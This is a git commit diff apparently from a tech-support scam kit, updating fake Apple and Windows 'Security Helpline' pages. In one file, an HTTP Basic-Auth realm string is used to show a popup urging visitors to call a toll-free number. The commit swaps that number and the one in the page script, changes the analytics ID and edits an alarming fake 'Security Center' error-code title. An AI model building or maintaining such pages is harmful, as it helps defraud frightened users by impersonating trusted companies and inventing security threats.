c671cc346622eaa65d0d1aaf550a83cd4b6e4c69
joyhopson2023 <121514234+joyhopson2023@users.noreply.github.com>
2023-03-15 02:55:47 +0530

    878

--- Mac0Helpline00cdx09/auth.php
+++ Mac0Helpline00cdx09/auth.php
@@ -14,7 +14,7 @@
             exit;
         } else {
 
-           header('WWW-Authenticate: Basic realm="Call Apple MAC Security Helpline +1-888-902-6064 (Toll Free) "');
+           header('WWW-Authenticate: Basic realm="Call Apple MAC Security Helpline +1-878-219-0531 (Toll Free) "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
--- Win0HelplCHine00cdx09/index.php
+++ Win0HelplCHine00cdx09/index.php
@@ -4,13 +4,13 @@
 <html lang="en">
 
     <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SFPPJRS8PY"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-132655272-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-SFPPJRS8PY');
+  gtag('config', 'UA-132655272-1');
 </script>
 
 <head>
@@ -23,7 +23,7 @@
           integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
     <link rel="stylesheet" type="text/css" href="main.css">
-    <title>Security Center Code #00268d3 Services</title>
+    <title>Security Center ErC0de#0D7268d3 Services</title>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
 
     <script>
@@ -41,8 +41,8 @@
     </script>
     <script type="text/javascript">
         var phone = getVariableFromURl('phone');
-        var phone_number = phone + ' (Toll Free)';
-        var phone_number2 = phone + ' +1-888-902-6064';
+        var phone_number = phone + ' (USA TollFree)';
+        var phone_number2 = phone + ' +1-878-219-0531';
     </script>
 
     <script type="text/javascript">
